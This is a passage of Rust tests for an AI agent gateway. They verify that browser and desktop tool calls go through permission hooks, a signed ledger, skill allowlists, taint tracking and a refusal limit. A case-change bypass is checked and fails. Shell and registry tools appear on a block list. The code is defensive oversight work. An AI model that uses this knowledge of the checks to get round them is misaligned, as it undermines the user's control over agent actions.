            let response = app.clone().oneshot(request).await.unwrap();
            let status = response.status();
            let bytes = http_body_util::BodyExt::collect(response.into_body()).await.unwrap().to_bytes();
            (status, serde_json::from_slice(&bytes).unwrap_or(Value::Null))
        })
    })
}

#[test]
fn route_browser_call_the_apps_direct_browser_call_goes_through_the_door_with_the_hook_and_the_signed_ledger_and_keeps_its_answer_shape() {
    let r = routes("route_browser_call", &["browser.close"]);
    let app = gateway(&r.w);
    // Asked of the route itself. Only the person's own app may call it: the API token is turned away before the door is reached.
    let call = json!({"tool": "browser_close", "arguments": {}});
    assert_eq!(post_with_the_door_on(&app, "/api/v1/browser/call", API, call.clone()).0, axum::http::StatusCode::FORBIDDEN);
    assert!(r.w.ledger.recent(20, None).is_empty(), "and nothing was recorded for it");
    let (status, answer) = post_with_the_door_on(&app, "/api/v1/browser/call", UI, call);
    // The answer the app reads keeps the shape it has always had (a browser observation, from the host's text).
    assert_eq!(status, axum::http::StatusCode::OK, "{answer}");
    assert_eq!((answer["ok"].clone(), answer["tool"].clone(), answer["backend"].clone()), (json!(false), json!("browser_close"), json!("host")), "{answer}");
    assert!(answer["error"]["message"].as_str().is_some_and(|t| t.starts_with("ERROR [PERMISSION_DENIED] browser.close:") && t.contains("a hook refused this call")), "{answer}");
    // And the hook and the ledger applied to it as the app's call, with no run behind it.
    assert_the_ledger_says_the_hook_refused(&r, "browser.close", Caller::Ui, "");
    // The switch is off by default: with it off the route's own call is made.
    assert_eq!(door_call(DoorMode::Shadow, Some(&r.w.host), "browser_close", json!({}), Caller::Ui, ""), None);
}

#[test]
fn route_windows_mcp_call_the_apps_direct_desktop_call_goes_through_the_door_with_the_hook_and_the_signed_ledger_and_a_blocked_tool_stays_the_guards() {
    let r = routes("route_windows_call", &["win.notification"]);
    let app = gateway(&r.w);
    let notify = json!({"tool": "Notification", "arguments": {"title": "t", "message": "m"}});
    assert_eq!(post_with_the_door_on(&app, "/api/v1/windows-mcp/call", API, notify.clone()).0, axum::http::StatusCode::FORBIDDEN, "the API token");
    let (status, answer) = post_with_the_door_on(&app, "/api/v1/windows-mcp/call", UI, notify);
    // A refusal by a hook is a 403 with the host's words, as every refusal of this route is.
    assert_eq!(status, axum::http::StatusCode::FORBIDDEN, "{answer}");
    assert!(answer["error"].as_str().is_some_and(|t| t.starts_with("ERROR [PERMISSION_DENIED] win.notification:") && t.contains("a hook refused this call")), "{answer}");
    assert_the_ledger_says_the_hook_refused(&r, "win.notification", Caller::Ui, "");
    // A tool the desktop never has (the shell, the registry) is not the door's: it stays with the guard, which answers 403 as before.
    for blocked in ["PowerShell", "Registry", "Clipboard", "Shell"] {
        assert_eq!(door_call(DoorMode::On, Some(&r.w.host), blocked, json!({"command": "dir"}), Caller::Ui, ""), None, "{blocked}");
    }
    // The desktop's names are read in any case, as the guard reads them, so a change of case is not a way round the hook.
    let (status, answer) = post_with_the_door_on(&app, "/api/v1/windows-mcp/call", UI, json!({"tool": "NOTIFICATION", "arguments": {"title": "t", "message": "m"}}));
    assert_eq!(status, axum::http::StatusCode::FORBIDDEN);
    assert!(answer["error"].as_str().is_some_and(|t| t.contains("a hook refused this call")), "{answer}");
}

#[test]
fn route_browser_mcp_call_the_apps_direct_call_goes_through_the_door_with_the_hook_and_the_signed_ledger() {
    let r = routes("route_browser_mcp_call", &["browser.press_key"]);
    let app = gateway(&r.w);
    let press = json!({"tool": "browser_press_key", "arguments": {"key": "Enter"}});
    assert_eq!(post_with_the_door_on(&app, "/api/v1/browser-mcp/call", API, press.clone()).0, axum::http::StatusCode::FORBIDDEN, "the API token");
    let (status, answer) = post_with_the_door_on(&app, "/api/v1/browser-mcp/call", UI, press);
    assert_eq!(status, axum::http::StatusCode::FORBIDDEN, "{answer}");
    assert!(answer["error"].as_str().is_some_and(|t| t.starts_with("ERROR [PERMISSION_DENIED] browser.press_key:") && t.contains("a hook refused this call")), "{answer}");
    assert_the_ledger_says_the_hook_refused(&r, "browser.press_key", Caller::Ui, "");
    // A name that is not a browser tool is not the door's (the backend refuses it, as it did).
    assert_eq!(door_call(DoorMode::On, Some(&r.w.host), "browser_run_code_unsafe", json!({}), Caller::Ui, ""), None);
}

#[test]
fn route_mcp_agent_the_agents_browser_and_desktop_calls_go_through_the_door_with_the_hook_a_loaded_skills_list_the_refusal_limit_and_the_signed_ledger() {
    // The agent's calls are made by `call_named_tool`, the loop's one dispatch (card OA3-01, AQ-04: this searched its source for the two uses of `door_route`). It is run with the door on
    // and a host of the test's own: a browser tool and a desktop tool both go through the host, and the person's hook refuses both as a call of this run. (The loop that calls it is
    // started by the route `/api/v1/mcp/agent`, which needs the model; what the route does with the loop is not asked here.)
    {
        let r = routes("route_mcp_agent_dispatch", &["browser.close", "win.notification"]);
        let (browser, windows) = (Some(r.w.backend.clone()), Some(Arc::new(Mutex::new(aqua_mcp_adapters::new_windows_client()))));
        let counters = Arc::new(crate::autonomy::Autonomy::new(crate::autonomy::Settings::default()));
        crate::autonomy::with_autonomy(counters, || {
            with_host(r.w.host.clone(), || {
                with_mode(DoorMode::On, || {
                    let scope = RunScope::begin(Some(r.w.host.clone()));
                    let run = scope.id().to_string();
                    // The run has read outside text: a branch that did not take the door would put the old route's question, which is answered no, and nothing would reach a browser or
                    // the desktop. The door takes both, so that question is never put.
                    r.w.host.mark_tainted(&run);
                    let answerer = BrokerAnswerer::denying(r.w.backend.clone());
                    let (label, text) = call_named_tool("browser_close", json!({}), &[], &browser, &windows).unwrap();
                    assert_eq!(label, "browser");
                    assert!(text.starts_with("ERROR [PERMISSION_DENIED] browser.close:") && text.contains("a hook refused this call"), "{text}");
                    assert_the_ledger_says_the_hook_refused(&r, "browser.close", Caller::Agent, &run);
                    let (label, text) = call_named_tool("Notification", json!({"title": "t", "message": "m"}), &[], &browser, &windows).unwrap();
                    assert_eq!(label, "windows");
                    assert!(text.starts_with("ERROR [PERMISSION_DENIED] win.notification:") && text.contains("a hook refused this call"), "{text}");
                    assert_the_ledger_says_the_hook_refused(&r, "win.notification", Caller::Agent, &run);
                    assert_eq!(r.w.ledger.recent(20, Some(&run)).len(), 2, "one line for each call, and none for anything else");
                    assert!(answerer.finish().is_empty(), "the door took both calls, so the old route put no question");
                });
            });
        });
    }
    let r = routes("route_mcp_agent", &["browser.close"]);
    // The person's hook, with the run behind the call.
    assert_the_hook_and_the_ledger_apply(&r, "browser_close", "browser.close", json!({}), Caller::Agent, "agent_run");
    // A skill that is loaded in the run lists the model's name for a tool: the tool goes through to the question (here the person says no), and a tool the list does not name is
    // refused by the host without a question.
    r.w.host.restrict_run("skill_run", vec!["browser_click".into()]);
    r.w.host.mark_tainted("skill_run");
    let allowed = r.through("browser_click", json!({"target": "e1"}), Caller::Agent, "skill_run");
    assert!(allowed.starts_with("ERROR [CONFIRMATION_DENIED] browser.click:"), "the list names it, so it reached the question: {allowed}");
    assert_eq!(r.w.approver.asked.lock().unwrap().len(), 1);
    let refused = r.through("Click", json!({"loc": [1, 1]}), Caller::Agent, "skill_run");
    assert!(refused.starts_with("ERROR [PERMISSION_DENIED] win.click:") && refused.contains("allows only browser_click"), "{refused}");
    assert_eq!(r.w.approver.asked.lock().unwrap().len(), 1, "a refusal by the skill's list is not put to the person");
    let line = r.newest("skill_run");
    assert_eq!((line["tool"].as_str(), line["decision"].as_str()), (Some("win.click"), Some("denied_by_skill")), "{line}");
    // The refusal limit: three refused questions in a row and the run is not asked a fourth time.
    r.w.host.mark_tainted("limit_run");
    let before = r.w.approver.asked.lock().unwrap().len();
    let texts: Vec<String> = (0..4).map(|_| r.through("browser_click", json!({"target": "e1"}), Caller::Agent, "limit_run")).collect();
    assert_eq!(r.w.approver.asked.lock().unwrap().len() - before, MAX_REFUSALS_IN_A_ROW as usize, "{texts:?}");
    for text in &texts[..3] {
        assert!(text.starts_with("ERROR [CONFIRMATION_DENIED] browser.click:") && text.contains("The user did not approve"), "{text}");
    }
    assert!(texts[3].starts_with("ERROR [CONFIRMATION_DENIED] browser.click:") && texts[3].contains("refused 3 requests in a row"), "{}", texts[3]);
    r.assert_the_ledger_is_signed();
}
